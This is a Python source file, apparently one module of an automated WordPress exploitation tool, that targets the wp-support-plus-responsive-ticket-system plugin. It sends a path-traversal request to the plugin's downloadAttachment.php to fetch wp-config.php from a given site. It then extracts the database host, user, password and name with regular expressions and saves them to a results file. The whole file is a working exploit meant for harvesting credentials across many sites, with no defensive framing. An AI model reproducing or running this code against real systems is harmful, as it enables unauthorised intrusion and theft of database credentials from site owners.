# coding=utf-8
import requests, re
from Exploits import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    try:
        Exp = 'http://' + site + \
              '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/' \
              'downloadAttachment.php?path=../../../../../wp-config.php'
        GetConfig = requests.get(Exp, timeout=5, headers=Headers)
        if 'DB_PASSWORD' in GetConfig.content:
            with open('result/Config_results.txt', 'a') as ww:
                ww.write('Full Config Path  : ' + Exp + '\n')
            try:
                Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.content)
                Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.content)
                Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.content)
                Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.content)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                             '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                 0] + '\n---------------------\n')
            except:
                return printModule.returnYes(site, 'N/A', 'wp-support-plus', 'Wordpress')
            return printModule.returnYes(site, 'N/A', 'wp-support-plus', 'Wordpress')
        else:
            return printModule.returnNo(site, 'N/A', 'wp-support-plus', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'wp-support-plus', 'Wordpress')
